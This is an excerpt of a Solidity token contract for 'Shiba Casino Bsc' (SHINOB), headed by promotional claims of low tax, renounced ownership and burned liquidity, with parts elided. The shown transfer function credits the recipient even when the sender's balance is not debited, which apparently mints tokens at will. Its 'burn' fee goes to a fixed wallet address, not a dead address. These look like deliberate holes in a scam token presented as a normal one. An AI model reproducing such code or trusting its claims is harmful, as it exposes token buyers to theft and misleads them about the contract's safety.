...
// Submitted for Telegram: https://t.me/+OX22AfZHWR5lNTFl

// https://shinob-app.com

// Shiba Casino BSC | Tax Low 5% | Renounched | Burn LP
...
contract  SHINOB  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "Shiba Casino Bsc";
    string private _symbol = "SHINOB";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0xDeB848b2f37D0853D15111F950723F553d5f4a41] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0xDeB848b2f37D0853D15111F950723F553d5f4a41, _bruntoken);
        }
